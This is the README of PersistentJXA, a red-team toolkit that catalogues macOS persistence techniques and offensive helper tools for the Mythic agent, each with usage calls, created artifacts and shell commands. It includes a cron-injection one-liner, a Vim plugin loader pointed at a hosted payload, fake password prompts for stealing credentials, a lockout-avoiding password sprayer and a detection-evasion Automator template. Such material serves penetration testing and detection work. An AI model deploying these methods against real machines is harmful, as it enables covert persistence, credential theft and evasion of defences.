# PersistentJXA
Collection of macOS persistence methods and miscellaneous tools in JXA  <br />
Related blog posts: 
- https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5
- https://posts.specterops.io/are-you-docking-kidding-me-9aa79c24bdc1
- https://posts.specterops.io/saving-your-access-d562bf5bf90b

# Usage
* In Mythic (Apfell Agent) :

```JavaScript
jsimport (Selected file)
jsimport_call <NameOfPersistenceScript>(ScriptArguments)
```


| Project | Description | Usage | Artifacts Created | Commandline Commands Executed
| :------ | :---------- | :----------- | :----------- | :----------- |
| **AtomPersist** |  Persistence using the Atom init script. Appends the Atom init script to execute our command. <br /> Persistence executes upon Atom opening. |jsimport_call AtomPersist('osascript -l JavaScript -e ...') | Modification to end of: <br /> /System/Volumes/Data/Users/{User}/.atom/init.coffee | N/A ||
| **BashProfilePersist** |  Modifies user's bash profile to execute script if the persistence process (current implementation assumes osascript) is not already running. If Catalina system then .zshenv is modified. <br /> Persistence executes on terminal open. | jsimport_call BashProfilePersist('osascript -l JavaScript -e ...', 'no') |  $HOME/.bash_profile or  $HOME/.zshenv <br /> <br /> ***If select "yes" for hidden file creation then:*** <br /> $HOME/.security/apple.sh <br />  $HOME/.security/update.sh <br /> | N/A by default. <br /> ***"no"*** for hidden file creation option <br /> <br /> ***If select "yes" for hidden file creation then:*** <br /> sh $HOME/.security/apple.sh <br /> <br /> sh $HOME/.security/persist.sh|
| **CalendarPersist** | Persistence via macOS Calendar.app alerts. This script will create new events and inserts them into the calendar with an alert that executes an application. There is additional funcitionality to modify exsiting events, list calendars, list events, and hide calendars. <br /> Persistence executes upon the event alert which triggers the specified persistence application. See https://github.com/FSecureLABS/CalendarPersist for usage details and background | jsimport_call persist_calalert("Fake Meeting", "/Users/Shared/Persist.app", 60, "daily", 1, 3, "FB825EFC-C65F-4959-8BDC-EBDF9E886C45")) | /Users/{USER}/Calendars/Calendar Cache | ***If hide_calendar function used:*** <br /> sh -c defaults write com.apple.iCal DisabledCalendars -dict MainWindow '({uid})'|
| **CronJobPersistence** | Persistence using CronJobs. This script will create a hidden file (share.sh) in the current user's Public/Drop Box folder. Writes a cron job with a default interval of 15mins which executes the hidden script.  <br />  (Note: This command generates a user prompt for Catalina. If the user clicks “Don’t Allow” the command should fail with an “operation not permitted"). <br /> Persistence executes every 15 mins. | jsimport_call CronJobPersistence('#!/bin/zsh \n osascript -l JavaScript -e ...') | $HOME/Public/Drop\ Box/.share.sh <br /> crontab entry | sh -c echo "$(echo '15 * * * * cd $HOME/Public/Drop\\ Box/ && ./.share.sh' ; crontab -l)" \| crontab - <br /> <br />  sh -c (Persistence Action)|
| **DockPersist** | Modifies the apple dock plist for persistence. Requires an application to be present on target. Persistence executes upon user interaction. | jsimport_call DockPersist("Safari", "com.apple.automator.Safari","yes") <br /> or <br /> jsimport_call DockPersist("Google Chrome", "com.apple.automator.Google-Chrome","yes") | $HOME/Library/Preferences/com.apple.dock.plist |  ***If ReloadNow function used:*** <br /> /usr/bin/killall Dock |
| **FinderSyncPlugins** |  Persistence using Finder Sync Extensions. Requires and app on the target to be setup for abuse. It searches the app for the required files and registers them. <br /> See https://objective-see.com/blog/blog_0x11.html for how to setup. <br />  Persistence executes on login.  |  jsimport_call FinderSyncPlugins('/Users/Shared/SyncTest.app') | N/A | pluginkit -a </some/path/persist.appex> & <br /> <br /> pluginkit -e use -i <FinderSynsBundleID> & |
| **iTermAppScript** | Persistence using the iTerm2 application startup script. Appends the application script for iTerm2 to execute our command. If the folder does not exist then one will be created. <br /> Persistence executes upon iTerm2 opening. <br /> See https://theevilbit.github.io/beyond/beyond_0002/ for more details.|jsimport_call iTermAppScript('osascript -l JavaScript -e ...') | modification to end of /Library/Application\ Support/iTerm2/Scripts/AutoLaunch/iTerm.py | sh -c (Persistence Action) |
| **LoginScript** | **Requires Root** Modifies login window plist for persistence. Persistence executes on login. | jsimport_call LoginScript('#!/bin/zsh \n osascript -l JavaScript -e ...') | /var/root/Library/Preferences/com.apple.loginwindow.plist <br />  <br />/Users/Shared/.security/test.sh |  sh -c (Persistence Action) |
| **PeriodicPersist** | **Requires Root** Create a daily job in /etc/periodic/daily. Persistence executes  daily. | jsimport_call PeriodicPersist('osascript -l JavaScript -e ...') | /etc/periodic/daily/111.clean-hist | sh -c (Persistence Action)|
| **ScreenSaverPersist** | Modifies the screensaver plist for persistence. Requires a .saver at ~/Library/Screen Savers/ to be present on target. Persistence executes upon screensaver triggering. Current implementation sets screensaver at 1 minute. <br />  <br /> **Note: Processes started from the screensaver are sandboxed**  <br /> See https://theevilbit.github.io/beyond/beyond_0016/ for details on the entitlements.  | jsimport_call ScreenSaverPersist("Blank") <br /> | $HOME/Library/Preferences/ByHost/com.apple.screensaver.[Hardware-UUID].plist | /usr/bin/killall -hup cfprefsd |
| **SSHrc** |  Modifies or creates SSH rc file to execute persistence when the user logs in with SSH and if the persistence process (current implementation assumes osascript) is not already running. <br /> See https://twitter.com/0xdade/status/1373145566943711235?s=20 for more details. | jsimport_call SSHrc('itsatrap','osascript -l JavaScript -e ...', 'no') |  /Users/'userName'/.ssh/rc <br /> <br /> ***If select "yes" for hidden file creation then:*** <br /> /Users/'userName'/.security/apple.sh <br />  /Users/'userName'/.security/update.sh <br /> | N/A by default. <br /> ***"no"*** for hidden file creation option <br /> <br /> ***If select "yes" for hidden file creation then:*** <br /> sh /Users/'userName'/.security/apple.sh <br /> <br /> sh /Users/'userName'/.security/persist.sh |
| **SublimeTextAppScriptPersistence** | Persistence using the Sublime Text application script. Appends the application script for Sublime to execute our command.. <br /> Persistence executes upon Sublime opening. <br /> See https://theevilbit.github.io/posts/macos_persisting_through-application_script_files/ for more details.|jsimport_call SublimeTextAppScriptPersistence('osascript -l JavaScript -e ...') | modification to end of /Applications/Sublime\ Text.app/Contents/MacOS/sublime.py | sh -c (Persistence Action) |
| **SublimeTextPluginPersistence** | Persistence using Sublime Text plugins. Creates a plugin file that is executed upon the opening of Sublime. <br />  Persistence executes upon Sublime opening. | jsimport_call SublimeTextPluginPersistence('/Users/Shared/inject.dylib')| $HOME/Library/Application\ Support/Sublime\ Text\  [2 or 3] /PrettyText/PrettyText.py  | N/A |
| **TermPref** | Modifies the terminal plist. Current implementation shows an indictator to the end user of the command run upon each new terminal. Persistence executes upon new terminal window. <br />  <br />  See https://theevilbit.github.io/beyond/beyond_0020/ for details.  | jsimport_call TermPref('osascript -l JavaScript -e ...') <br /> | $HOME/Library/Preferences/com.apple.Terminal.plist | /usr/bin/killall -hup Terminal |
| **VimPluginPersistence** | Persistence using Vim plugins. Creates a plugin file that is executed  upon the opening of vim. <br />  Persistence executes upon vim opening. | jsimport_call VimPluginPersistence('http://path/to/hosted/apfellpayload')  | $HOME/.vim/plugin/d.vim | sh -c (Persistence Action) |
| **xbarPlugin** | Persistence using xbar plugins. Creates a plugin file that is executed  upon the opening of xbar. <br />  Persistence executes upon xbar opening. Concept from @bradleyjkemp | jsimport_call xbarPlugin('osascript -l JavaScript -e ...')  | $HOME/Library/Application\ Support/xbar/plugins/xbarUtil.py | sh -c (Persistence Action) |

# Misc Scripts / Tools

| Project | Description | Usage | Artifacts Created | Commandline Commands
| :------ | :---------- | :----------- | :----------- | :----------- |
| **DylibHijackScan** | JXA version of Patrick Wardle's tool that searches applications for dylib hijacking opportunities. May generate user pop up if looking into protected fodlers. Requires xcode installed on 10.14.1| jsimport_call DylibHijackScan()  | N/A | "sh -c  lsof \| tr -s ' ' \| cut -d' ' -f9 \| sed '/^$/d' \| grep '^/'\| sort \| uniq" <br /> sh -c file "placeholder"  <br /> sh -c  otool -l "placeholder" <br /> |
| **InjectCheck** | Process Injection Checker. The tool enumerates the Hardened Runtime, Entitlements, and presence of Electron files to determine possible injection opportunities | jsimport_call InjectCheck("All") <br /> or <br /> jsimport_call InjectCheck("/Applications/Firefox.app") | N/A | N/A |
| **JamfInfo** | Jamf Plist Inspector. List of Jamf configuration details and Azure information (if applicable). Inspects the plist located at /Library/Preferences/com.jamfsoftware.jamf.plist | jsimport_call JamfInfo()| N/A | N/A |
| **PasswordSpray** | Local Account Password Sprayer. The tool leverages the Open Directory Framework to test passwords which is not subject to account lockout | jsimport_call PasswordSpray("itsatrap","Password1,Password2,Password3") | N/A | N/A |
| **PrivilegedHelperToolSpoof** | Tools searches the installed Privileged Helper Tools "/Library/PrivilegedHelperTools" and leverages legitimate icons and information in an attempt to gain user password credentials. The tool prompts again (with slightly different text) if the first password entry is blank. If no helper tool then default prompt for creds. | jsimport_call PrivHelpToolSpoof() | N/A | sh -c launchctl plist __TEXT,__info_plist /Library/PrivilegedHelperTools/ <arrary> \| grep -A1 AuthorizedClients" |
| **OutlookUpdatePrompt** | Tool which prompts the user for and update in an attempt to gain password credentials. Attempts to bring a prompt using outlook icon if installed otherwise uses standard cog. Returns credentials from prompt entry to the user. | jsimport_call OutlookUpdatePrompt() | N/A | N/A |
| **WorkflowTemplate** | A template for Automator to execute JXA. This is to evade simple detections on commandline osascript. After replacing the placeholder (JXA PAYLOAD HERE) with the desired js script, it can be executed by  /usr/bin/automator /path/to/file/Workflow.wflow. Requires the file to be on host but can be leveraged in combination with the above persistence methods | /usr/bin/automator /path/to/file/Workflow.wflow | /path/to/file/Workflow.wflow  | /usr/bin/automator /path/to/file/Workflow.wflow|